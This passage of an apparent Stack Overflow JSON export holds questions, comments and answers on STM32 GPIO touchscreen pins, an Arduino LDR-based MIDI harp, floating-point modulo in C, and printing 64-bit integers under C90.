X- (so the X- is not tristated?).\nHere's the code I use to configure the GPIO pins:</p>\n\n<pre><code>GPIO_InitTypeDef gpio;\ngpio.Pin = GPIO_PIN_2 | GPIO_PIN_1;\ngpio.Mode = GPIO_MODE_INPUT;\ngpio.Pull = GPIO_NOPULL;\nHAL_GPIO_Init(GPIOA, &amp;gpio);\n\ngpio.Pin = GPIO_PIN_0;\ngpio.Mode = GPIO_MODE_INPUT;\ngpio.Pull = GPIO_PULLUP;\nHAL_GPIO_Init(GPIOA, &amp;gpio);\n\ngpio.Pin = GPIO_PIN_5;\ngpio.Mode = GPIO_MODE_OUTPUT_PP;\nHAL_GPIO_Init(GPIOA, &amp;gpio);\n\nHAL_GPIO_WritePin(GPIOA, GPIO_PIN_5, GPIO_PIN_RESET);\n\n/* initialization using registers, works the same as above */\n\n//  /* Xr and Yu open (input floating) */\n//  GPIOA-&gt;MODER &amp;= ~(GPIO_MODER_MODE2 | GPIO_MODER_MODE1);\n//  GPIOA-&gt;PUPDR &amp;= ~(GPIO_PUPDR_PUPD2 | GPIO_PUPDR_PUPD1);\n//\n//  /* Xl input with pull-up */\n//  GPIOA-&gt;MODER &amp;= ~GPIO_MODER_MODE0;\n//  GPIOA-&gt;PUPDR |= GPIO_PUPDR_PUPD0_0;\n//\n//  /* Yd to GND (output set to 0) */\n//  GPIOA-&gt;MODER |= GPIO_MODER_MODE5_0;\n//  GPIOA-&gt;ODR &amp;= ~GPIO_ODR_OD5;\n</code></pre>\n\n<p>I can't understand what I am doing wrong or how to configure the tristated pins correctly so they don't pull down the X+ pin.</p>\n"}, {"tags": ["c++", "c", "midi", "arduino-uno"], "comments": [{"owner": {"reputation": 144819, "user_id": 2836621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/suHg4.jpg?s=128&g=1", "display_name": "Mark Setchell", "link": "https://stackoverflow.com/users/2836621/mark-setchell"}, "edited": false, "score": 0, "creation_date": 1518028148, "post_id": 48670539, "comment_id": 84339627, "body": "Not sure I get this. You say it works fine for one pair of LDRs but doesn&#39;t work when you add a second. Do you mean a second pair, i.e. 4 LDRs in total?"}, {"owner": {"reputation": 55, "user_id": 6435659, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/63c79f7731b8dc972c41f66a24b599e0?s=128&d=identicon&r=PG&f=1", "display_name": "Tyler", "link": "https://stackoverflow.com/users/6435659/tyler"}, "reply_to_user": {"reputation": 144819, "user_id": 2836621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/suHg4.jpg?s=128&g=1", "display_name": "Mark Setchell", "link": "https://stackoverflow.com/users/2836621/mark-setchell"}, "edited": false, "score": 0, "creation_date": 1518028926, "post_id": 48670539, "comment_id": 84340048, "body": "yes, there are 4 LDRs total"}, {"owner": {"reputation": 144819, "user_id": 2836621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/suHg4.jpg?s=128&g=1", "display_name": "Mark Setchell", "link": "https://stackoverflow.com/users/2836621/mark-setchell"}, "edited": false, "score": 0, "creation_date": 1518028991, "post_id": 48670539, "comment_id": 84340086, "body": "In <code>talkMIDI()</code> you test <code>cmd &amp; 0xF0 &lt;= 0xB0</code> . Should that actually be <code>&gt;=</code>?"}, {"owner": {"reputation": 144819, "user_id": 2836621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/suHg4.jpg?s=128&g=1", "display_name": "Mark Setchell", "link": "https://stackoverflow.com/users/2836621/mark-setchell"}, "edited": false, "score": 0, "creation_date": 1518029268, "post_id": 48670539, "comment_id": 84340272, "body": "What are you actually playing it through, btw?"}, {"owner": {"reputation": 55, "user_id": 6435659, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/63c79f7731b8dc972c41f66a24b599e0?s=128&d=identicon&r=PG&f=1", "display_name": "Tyler", "link": "https://stackoverflow.com/users/6435659/tyler"}, "reply_to_user": {"reputation": 144819, "user_id": 2836621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/suHg4.jpg?s=128&g=1", "display_name": "Mark Setchell", "link": "https://stackoverflow.com/users/2836621/mark-setchell"}, "edited": false, "score": 0, "creation_date": 1518030038, "post_id": 48670539, "comment_id": 84340725, "body": "I just tested with &gt;= and it didn&#39;t play any sound. It is a simple amplifier"}, {"owner": {"reputation": 144819, "user_id": 2836621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/suHg4.jpg?s=128&g=1", "display_name": "Mark Setchell", "link": "https://stackoverflow.com/users/2836621/mark-setchell"}, "edited": false, "score": 0, "creation_date": 1518031230, "post_id": 48670539, "comment_id": 84341373, "body": "I can&#39;t find any amplifiers with MIDI inputs..."}, {"owner": {"reputation": 144819, "user_id": 2836621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/suHg4.jpg?s=128&g=1", "display_name": "Mark Setchell", "link": "https://stackoverflow.com/users/2836621/mark-setchell"}, "edited": false, "score": 1, "creation_date": 1518031699, "post_id": 48670539, "comment_id": 84341674, "body": "I would have thought you would want to immediately do 4 <code>analogRead()s</code> at the start of each loop and then decide what to do when you have them all. Otherwise you read <code>val[0]</code> only and then decide what to do partially based on <code>val[1]</code> through <code>val[3]</code> which you have yet to read."}], "owner": {"reputation": 55, "user_id": 6435659, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/63c79f7731b8dc972c41f66a24b599e0?s=128&d=identicon&r=PG&f=1", "display_name": "Tyler", "link": "https://stackoverflow.com/users/6435659/tyler"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 126, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1518026662, "creation_date": 1518026662, "question_id": 48670539, "link": "https://stackoverflow.com/questions/48670539/arduino-uno-midi-notes-playing-incorrectly", "title": "Arduino-uno midi notes playing incorrectly", "body": "<p>I am designing an arduino-uno based electronic harp using LDRs as the strings (when the LDR is pressed the note plays). It is midi based. It currently has four LDRs that play the correct notes when pressed. I am trying to make it play a different note when two LDRs are pressed to expand the range. This works when I have the code for one pair of LDRs but when I add code for a second it sounds extremely wrong, playing a growling sound. </p>\n\n<p>This is the code for one pair of LDRs:</p>\n\n<pre><code>for (nt=0;nt&lt;notes;nt++) \n  {\n      val[nt]=analogRead(Det[nt]);\n      delay(1);\n\n      if (val[0]&lt;threshold[1]&amp;&amp;val[1]&lt;threshold[1]){\n            if(prev_nts[nt] == false) {\n              digitalWrite(LED[0], HIGH);  //TURN led ON if value below threshold\n              digitalWrite(LED[1], HIGH);\n              noteOn(0, music[0], vol[nt]); //note (middle number) 40-62, (channel, pitch, volume from array)\n              prev_nts[nt] = true;\n            }}\n      else {\n          digitalWrite(LED[0], LOW);\n          digitalWrite(LED[1], LOW);\n          //TURN led OFF if value below threshold\n          noteOff(0, music[0], 0); //note (middle number) 40-62\n          prev_nts[nt] = false;\n        }\n}\n</code></pre>\n\n<p>This is my code for two pairs of LDRs:</p>\n\n<pre><code>for (nt=0;nt&lt;notes;nt++) \n  {\n      val[nt]=analogRead(Det[nt]);\n      delay(1);\n\n      if (val[0]&lt;threshold[1]&amp;&amp;val[1]&lt;threshold[1]){\n            if(prev_nts[nt] == false) {\n              digitalWrite(LED[0], HIGH);  //TURN led ON if value below threshold\n              digitalWrite(LED[1], HIGH);\n              noteOn(0, music[0], vol[nt]); //note (middle number) 40-62, (channel, pitch, volume from array)\n              prev_nts[nt] = true;\n            }}\n      else {\n          digitalWrite(LED[0], LOW);\n          digitalWrite(LED[1], LOW);\n          //TURN led OFF if value below threshold\n          noteOff(0, music[0], 0); //note (middle number) 40-62\n          prev_nts[nt] = false;\n        }\n\n\n      if (val[2]&lt;threshold[2]&amp;&amp;val[3]&lt;threshold[3]){\n            if(prev_nts[nt] == false) {\n              digitalWrite(LED[2], HIGH);  //TURN led ON if value below threshold\n              digitalWrite(LED[3], HIGH);\n              noteOn(0, music[1], vol[nt]); //note (middle number) 40-62, (channel, pitch, volume from array)\n              prev_nts[nt] = true;\n            }}\n      else {\n          digitalWrite(LED[2], LOW);\n          digitalWrite(LED[3], LOW);\n          //TURN led OFF if value below threshold\n          noteOff(0, music[1], 0); //note (middle number) 40-62\n          prev_nts[nt] = false;\n        }\n</code></pre>\n\n<p>}</p>\n\n<p>This is my whole code:</p>\n\n<pre><code>// 4 channel photodetector and LED indicator. \n// Kate Sugden, August 2017\n\n#include &lt;SoftwareSerial.h&gt;\nSoftwareSerial mySerial(2, 3); // RX, TX\n\n//  pins for photodetectors and LED indicators\n  byte ledPin = 13; //MIDI traffic inidicator\n\n  int Det[] = {A0,A1,A2,A3};  // defines Detecotr pins\n  int LED[] = {11,10,9,8};  // defines LED indicator pins\n  int notes = 4;              //number of notes in harp\n  int val []  = {0,0,0,0};   // sets all the values of the detector readings to zero - need as many as notes\n  int threshold []  = {0,0,0,0}; \n  boolean prev_nts[] = {false,false,false,false};\n  int music[] = {48,50,52,53};\n  boolean notePressed = false;\n\n\n// defined delays and thresholds\n  int nt = 0;   // note number\n  int timer = 10;  // delay option\n\n\n//MIDI\n  byte note = 0; //The MIDI note value to be played\n  byte resetMIDI = 4; //Tied to VS1053 Reset line\n // int  instrument = 118; //Harp is 47, 80 Ocarina, 46 Pizzicato strings (most convincing) percussion 36, 118 synth drum\n int instrument[] = {118,117,49,115};\n int definst=46; //default instrument\n int vol[]={100,100,100,100}; //sets volume (127 is max)\n\nvoid setup()\n{\n  Serial.begin(9600);\n  // Serial.begin(31250);\n\n  // we make all the declarations at once\n  for (nt=0;nt&lt;notes;nt++) \n    {\n      pinMode(Det[nt], INPUT);   //declares detectors\n      pinMode(LED[nt], OUTPUT);  //declares indicators\n      val[nt]=analogRead(Det[nt]); //this reads the LDR values once\n      threshold[nt]=val[nt]-20; // this then calculates a threshold value for each channel based on starting ambient light and sets the threshold X below this. .\n    }\n\n  //this bit configures the midi\n  mySerial.begin(31250);\n  pinMode(resetMIDI, OUTPUT);\n  digitalWrite(resetMIDI, LOW);\n  delay(100);\n  digitalWrite(resetMIDI, HIGH);\n  delay(100);\n  talkMIDI(0xB0, 0x07, vol[0]); //0xB0 is channel message, set channel volume (3rd number) to near max (127)\n  talkMIDI(0xB0, 0, 0x79);\n  talkMIDI(0xC0, definst, 0);\n}\n\nvoid loop()\n\n{   \n  for (nt=0;nt&lt;notes;nt++) \n  {\nval[nt]=analogRead(Det[nt]);\n      delay(1);\n\n      if (val[0]&lt;threshold[1]&amp;&amp;val[1]&lt;threshold[1]){\n            if(prev_nts[nt] == false) {\n              digitalWrite(LED[0], HIGH);  //TURN led ON if value below threshold\n              digitalWrite(LED[1], HIGH);\n              noteOn(0, music[0], vol[nt]); //note (middle number) 40-62, (channel, pitch, volume from array)\n              prev_nts[nt] = true;\n            }}\n      else {\n          digitalWrite(LED[0], LOW);\n          digitalWrite(LED[1], LOW);\n          //TURN led OFF if value below threshold\n          noteOff(0, music[0], 0); //note (middle number) 40-62\n          prev_nts[nt] = false;\n        }\n\n\n      if (val[2]&lt;threshold[2]&amp;&amp;val[3]&lt;threshold[3]){\n            Serial.println(notePressed); //never reaching here\n            if(prev_nts[nt] == false) {\n              digitalWrite(LED[2], HIGH);  //TURN led ON if value below threshold\n              digitalWrite(LED[3], HIGH);\n              noteOn(0, music[1], vol[nt]); //note (middle number) 40-62, (channel, pitch, volume from array)\n              prev_nts[nt] = true;\n            }}\n      else {\n          digitalWrite(LED[2], LOW);\n          digitalWrite(LED[3], LOW);\n          //TURN led OFF if value below threshold\n          noteOff(0, music[1], 0); //note (middle number) 40-62\n          prev_nts[nt] = false;\n        }\n}\n}\n\nvoid noteOn(byte channel, byte note, byte attack_velocity) {\n  talkMIDI( (0x90 | channel), note, attack_velocity);\n}\n//Send a MIDI note-off message.  Like releasing a piano key\nvoid noteOff(byte channel, byte note, byte release_velocity) {\n  talkMIDI( (0x80 | channel), note, release_velocity);\n}\nvoid talkMIDI(byte cmd, byte data1, byte data2) {\n  digitalWrite(ledPin, HIGH);\n  mySerial.write(cmd);\n  mySerial.write(data1);\n//Some commands only have one data byte. All cmds less than 0xBn have 2 data bytes \n//(sort of: http://253.ccarh.org/handout/midiprotocol/)\n  if( (cmd &amp; 0xF0) &lt;= 0xB0)\n    mySerial.write(data2);\n  digitalWrite(ledPin, LOW);\n}\n</code></pre>\n\n<p>This is also my first time programming using arduino, so I may not be aware of simple mistakes. I usually program in Java and Python.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 613, "user_id": 3112926, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b33809c5d0f78b110e8613c9e5972dd5?s=128&d=identicon&r=PG&f=1", "display_name": "JGroven", "link": "https://stackoverflow.com/users/3112926/jgroven"}, "edited": false, "score": 2, "creation_date": 1518026630, "post_id": 48670495, "comment_id": 84338774, "body": "Look up how to use fmod."}], "answers": [{"tags": [], "owner": {"reputation": 4005, "user_id": 4200092, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/saOd8.png?s=128&g=1", "display_name": "GoBusto", "link": "https://stackoverflow.com/users/4200092/gobusto"}, "is_accepted": false, "score": 4, "last_activity_date": 1518026665, "creation_date": 1518026665, "answer_id": 48670540, "question_id": 48670495, "link": "https://stackoverflow.com/questions/48670495/c-language-float-float-why-expression-must-have-integral-type/48670540#48670540", "title": "C language: float % float why expression must have integral type", "body": "<p>You can only use <code>%</code> for getting the remainder of integer divisions.</p>\n\n<p>To get the remainder of a floating-point division, use the <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/fmod.html\" rel=\"nofollow noreferrer\"><code>fmod()</code></a> function instead.</p>\n"}, {"tags": [], "owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "is_accepted": false, "score": 3, "last_activity_date": 1518026672, "creation_date": 1518026672, "answer_id": 48670544, "question_id": 48670495, "link": "https://stackoverflow.com/questions/48670495/c-language-float-float-why-expression-must-have-integral-type/48670544#48670544", "title": "C language: float % float why expression must have integral type", "body": "<p>You can use <code>modff</code> to get the issue resolved.</p>\n\n<pre><code>float res = modff(x,&amp;y)\n</code></pre>\n\n<p>The integral part is stored in <code>y</code> and the fractional part is returned. <code>%</code> can't be used with non-integral types.</p>\n"}, {"tags": [], "owner": {"reputation": 646, "user_id": 1951645, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609825c28aaa9b4f23a634bd8b40d129?s=128&d=identicon&r=PG", "display_name": "Daniel Johnson", "link": "https://stackoverflow.com/users/1951645/daniel-johnson"}, "is_accepted": false, "score": 0, "last_activity_date": 1518026763, "creation_date": 1518026763, "answer_id": 48670570, "question_id": 48670495, "link": "https://stackoverflow.com/questions/48670495/c-language-float-float-why-expression-must-have-integral-type/48670570#48670570", "title": "C language: float % float why expression must have integral type", "body": "<p>cannot modulo floats. a way around this.</p>\n\n<pre><code>float x = 20.4\nint xint = (int)(x);\nint y = 4;\nfloat z = x % y + (x-xint)\n</code></pre>\n"}], "owner": {"reputation": 131, "user_id": 9268588, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/25114647b854c5a9f410a84b2963b9ba?s=128&d=identicon&r=PG&f=1", "display_name": "Dean Movy", "link": "https://stackoverflow.com/users/9268588/dean-movy"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2351, "favorite_count": 0, "closed_date": 1518026748, "answer_count": 3, "score": -3, "last_activity_date": 1518026763, "creation_date": 1518026496, "question_id": 48670495, "link": "https://stackoverflow.com/questions/48670495/c-language-float-float-why-expression-must-have-integral-type", "closed_reason": "Duplicate", "title": "C language: float % float why expression must have integral type", "body": "<p>I try to do this operation so see if this operation will take only the complete part <code>(20%4)</code> or all <code>(20.4%4.4)</code></p>\n\n<pre><code>float x = 20.4;\nfloat y = 4.0;\nfloat z;\nz = x%y;\n</code></pre>\n\n<p>And got this compiler <code>error</code>:</p>\n\n<blockquote>\n  <p>expression must have integral type</p>\n</blockquote>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 5, "creation_date": 1518026447, "post_id": 48670422, "comment_id": 84338674, "body": "What is known as <a href=\"https://en.wikipedia.org/wiki/ANSI_C\" rel=\"nofollow noreferrer\">ANSI C</a> is actually the precursor to the ISO standardization of C. It is also <i>very old</i> and unless you have an equally old compiler you should at least attempt to use <a href=\"https://en.wikipedia.org/wiki/C99\" rel=\"nofollow noreferrer\">the C99 standard</a>. Even Microsoft Visual C compiler support most of C99 these days."}, {"owner": {"reputation": 5623, "user_id": 1347519, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a9e1eb6e25803528d25f57f3df79e115?s=128&d=identicon&r=PG", "display_name": "Attie", "link": "https://stackoverflow.com/users/1347519/attie"}, "edited": false, "score": 2, "creation_date": 1518026570, "post_id": 48670422, "comment_id": 84338740, "body": "&quot;<i>it fails...</i>&quot; - what errors do you see?"}, {"owner": {"reputation": 11, "user_id": 8286361, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65699b4181281fc7cf4037730139932f?s=128&d=identicon&r=PG&f=1", "display_name": "tmaxthomas", "link": "https://stackoverflow.com/users/8286361/tmaxthomas"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518026674, "post_id": 48670422, "comment_id": 84338798, "body": "@Someprogrammerdude I&#39;m well aware. This is actually code from a personal project that was C99 compliant, and that I&#39;m trying to make ANSI C compliant. If it turns out to not be reasonably possible I&#39;ll just go back to C99."}, {"owner": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "edited": false, "score": 0, "creation_date": 1518026782, "post_id": 48670422, "comment_id": 84338868, "body": "Can&#39;t remember exactly but was <code>uint64_t</code> defined in ANSI C? Probably not..."}, {"owner": {"reputation": 13998, "user_id": 2352344, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/JHVDS.png?s=128&g=1", "display_name": "clemens", "link": "https://stackoverflow.com/users/2352344/clemens"}, "edited": false, "score": 1, "creation_date": 1518026811, "post_id": 48670422, "comment_id": 84338875, "body": "@tmaxthomas: I get no compiler error for your code with this command line."}, {"owner": {"reputation": 11, "user_id": 8286361, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65699b4181281fc7cf4037730139932f?s=128&d=identicon&r=PG&f=1", "display_name": "tmaxthomas", "link": "https://stackoverflow.com/users/8286361/tmaxthomas"}, "reply_to_user": {"reputation": 5623, "user_id": 1347519, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a9e1eb6e25803528d25f57f3df79e115?s=128&d=identicon&r=PG", "display_name": "Attie", "link": "https://stackoverflow.com/users/1347519/attie"}, "edited": false, "score": 0, "creation_date": 1518026848, "post_id": 48670422, "comment_id": 84338898, "body": "@Attie Error message added to question."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1518026932, "post_id": 48670422, "comment_id": 84338934, "body": "Well since <code>uint64_t</code> was introduced in the C99 standard, there&#39;s really no portable way to handle 64-bit integers in older compilers. Why do you want to port it to an older standard? Considering that all three of the big compilers (GCC, Clang and MSVC) now support C99 (and all or most of C11 even) since long back, I don&#39;t really see a reason for it."}, {"owner": {"reputation": 11, "user_id": 8286361, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65699b4181281fc7cf4037730139932f?s=128&d=identicon&r=PG&f=1", "display_name": "tmaxthomas", "link": "https://stackoverflow.com/users/8286361/tmaxthomas"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518027076, "post_id": 48670422, "comment_id": 84339019, "body": "@Someprogrammerdude: The only reason I want to port it is to see if I can. The answer appears to be a resounding &quot;no&quot;, so I guess I&#39;ll just switch back to C99. Consider this question answered."}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 1, "creation_date": 1518034438, "post_id": 48670422, "comment_id": 84343179, "body": "The term &quot;ANSI C&quot; is commonly used to refer to the language defined by the 1989 ANSI C standard, which is identical to the language defined by the 1990 ISO C standard (which was then adopted by ANSI). The 1999 and 2011 editions of the C standard were published by ISO and then officially adopted by ANSI. So ANSI, the organization, recognizes ISO C11 as the current C standard. Since &quot;ANSI C&quot; is ambiguous, I suggest you refer to the year of a standard. By &quot;ANSI C&quot;, I suspect you mean C90 (which can also be called C89)."}, {"owner": {"reputation": 46978, "user_id": 856199, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/CPtki.png?s=128&g=1", "display_name": "Nikos C.", "link": "https://stackoverflow.com/users/856199/nikos-c"}, "edited": false, "score": 0, "creation_date": 1518035489, "post_id": 48670422, "comment_id": 84343733, "body": "Use this instead: <code>gcc -std=c99 main.c -Og -g -m32 -Wall -Werror -Wextra -pedantic</code>. That is, drop the <code>-ansi</code> and instead use <code>-std=c99</code> to use the C99 standard, which is more recent. <code>-ansi</code> will instead an older standard (C90), that you really shouldn&#39;t use anymore."}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 0, "creation_date": 1518036036, "post_id": 48670422, "comment_id": 84344014, "body": "Also, what exactly do you mean by &quot;32-bit C&quot;, and why do you want it? The <code>-m32</code> option affects which architecture it generates code for, but C itself doesn&#39;t have any defined &quot;bitness&quot;."}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "reply_to_user": {"reputation": 46978, "user_id": 856199, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/CPtki.png?s=128&g=1", "display_name": "Nikos C.", "link": "https://stackoverflow.com/users/856199/nikos-c"}, "edited": false, "score": 0, "creation_date": 1518036056, "post_id": 48670422, "comment_id": 84344025, "body": "@NikosC.: Why do you recommend <code>-std=c99</code> rather than <code>-std=c11</code>?"}, {"owner": {"reputation": 46978, "user_id": 856199, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/CPtki.png?s=128&g=1", "display_name": "Nikos C.", "link": "https://stackoverflow.com/users/856199/nikos-c"}, "reply_to_user": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 1, "creation_date": 1518036185, "post_id": 48670422, "comment_id": 84344093, "body": "@KeithThompson I don&#39;t, actually. But now it&#39;s too late to edit the comment :-| So yeah. If you don&#39;t have a reason to prefer C99 (like wanting better compatibility with Microsoft&#39;s C compiler, which AFAIK doesn&#39;t support C11?), then just use C11."}], "answers": [{"comments": [{"owner": {"reputation": 46978, "user_id": 856199, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/CPtki.png?s=128&g=1", "display_name": "Nikos C.", "link": "https://stackoverflow.com/users/856199/nikos-c"}, "edited": false, "score": 0, "creation_date": 1518035650, "post_id": 48672609, "comment_id": 84343812, "body": "Replacing <code>-ansi</code> with <code>-std=c99</code> (or <code>-std=c11</code> to use the C11 standard) would fix this. I suspect that the <code>-ansi</code> switch is misleading people here, since it kind of looks like a good way to enable &quot;standard C&quot; mode in GCC. The name of that switch is really unfortunate."}], "tags": [], "owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "is_accepted": false, "score": 2, "last_activity_date": 1518034948, "creation_date": 1518034948, "answer_id": 48672609, "question_id": 48670422, "link": "https://stackoverflow.com/questions/48670422/printf-format-specifier-for-int64-t-and-uint64-t-in-32-bit-ansi-c/48672609#48672609", "title": "printf() format specifier for int64_t and uint64_t in 32-bit ANSI C", "body": "<p>The phrase \"ANSI C\" commonly refers to the language defined by the 1989 ISO C standard. The 1990 ISO C standard describes exactly the same language (it adds some ISO-mandated sections). ANSI officially dropped its own 1989 standard and adopted the ISO standard -- and has also adopted the 1999 and 2011 editions of the ISO C standard. So the C standard defined by ANSI is the 2011 ISO C standard.</p>\n\n<p>Because of this ambiguity, I suggest avoiding the phrase \"ANSI C\" and referring to the year in which the standard was published by ISO: C90, C99, or C11.</p>\n\n<blockquote>\n  <p><strong>What format specifier should I use to print double-length integers in 32-bit ANSI C?</strong></p>\n</blockquote>\n\n<p>There is none.</p>\n\n<p>C90 did not support the  and  header or the type <code>long long</code>. It did not require support for any 64-bit integer type (<code>long</code> <em>may</em> be 64 bits, but is commonly 32). Because the types didn't exist, <code>printf</code> provided no format specifiers for them.</p>\n\n<p>In principle, you could use a C90 implementation that supports 64-bit <code>long</code> (sacrificing portability), or you could implement your own 64-bit type using an array of narrower integers, providing operations as functions.</p>\n\n<p>If you could update your question to explain exactly <strong>why</strong> you want to restrict yourself to a 29-year-old version of the C standard, it might be possible to give a more useful answer. I'd tell you simply to use an implementation that support C99 or C11, but you've indicated that's not a solution (without explaining why).</p>\n"}, {"comments": [{"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 0, "creation_date": 1518036123, "post_id": 48672714, "comment_id": 84344060, "body": "That doesn&#39;t ensure that you have 64-bit integers, it simply fails to compile if your compiler doesn&#39;t provide them."}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 0, "creation_date": 1518039981, "post_id": 48672714, "comment_id": 84345980, "body": "Which can be useful if that&#39;s what you need, but it&#39;s not what the OP was asking for."}, {"owner": {"reputation": 797, "user_id": 99124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffb4a98e32eb0337a855061470ea7a19?s=128&d=identicon&r=PG", "display_name": "mlp", "link": "https://stackoverflow.com/users/99124/mlp"}, "reply_to_user": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 0, "creation_date": 1518539273, "post_id": 48672714, "comment_id": 84543730, "body": "Actually (and I&#39;m sure Keith knows this) it aborts at <i>run-time</i> (I felt that the compile-time &quot;assert&quot; using a negative array size was a bit over the top here) if <code>long</code> is smaller than 64 bits. But if it runs, you are guaranteed that you have 64-bit integers. Unless you use an aftermarket multiple-precision package, the <i>only</i> way you get 64 bits in C89 is if the vendor provides them."}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 0, "creation_date": 1518550111, "post_id": 48672714, "comment_id": 84549952, "body": "You&#39;re right, it aborts at compile time, not at run time. (C89/C90 didn&#39;t have <code>#error</code>). I still don&#39;t think this answers the question."}, {"owner": {"reputation": 797, "user_id": 99124, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffb4a98e32eb0337a855061470ea7a19?s=128&d=identicon&r=PG", "display_name": "mlp", "link": "https://stackoverflow.com/users/99124/mlp"}, "reply_to_user": 